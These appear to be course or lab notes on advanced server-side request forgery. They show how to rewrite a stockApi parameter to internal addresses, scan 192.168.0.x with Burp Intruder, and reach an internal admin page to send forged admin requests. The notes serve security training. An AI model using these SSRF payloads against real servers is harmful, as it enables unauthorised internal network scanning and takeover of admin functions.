# Section 17: SSRF - Advanced Exploitation

## Advanced SSRF Discover

_Using Intruder functionality of Burp suite to discover connected clients to the same network as the web server hosting the vulnerable web application 
and services running_

same stockApi ➡️ turn on the Interceptor ➡️ URL decode

```
stockApi=http://192.168.0.1:8080/product/stock/check?product=3&storeId=2
```

the server that wosting the website is sending the request to another server to get data from it

This request uses an internal (reserved) IP and port:

```
stockApi=http://192.168.0.1:8080/product/stock/check?product=3&storeId=2
```

### Discover the SSRF 

➡️ send request to the repeater

```
stockApi=http://192.168.0.1:8080/
```

and URL encode it

getting a "Missing parameter" response, now try a different IP

```
stockApi=http://192.168.0.2:8080/
```

500 error: Could not connect to external stock check service


---

## Scanning & Mapping Internal Network & Services

Right click request ➡️ send to Intruder ➡️ clear §

- modify port
  - add §
  - Attack type: Sniper (single replacement)
  - Payloads set: 1
  - Payload type: Numbers
  - Payload Options From: 1
  - Payload Options To: 254 (step 1)
  - URL enclode

When status is 400 or 404 (instead of 500) the IP is active

send request with valid IP to repeater e.g.

```
stockApi=http://192.168.0.167:8080/admin
```

admin page is rendered, send forged requests for every admin action to modify content

---


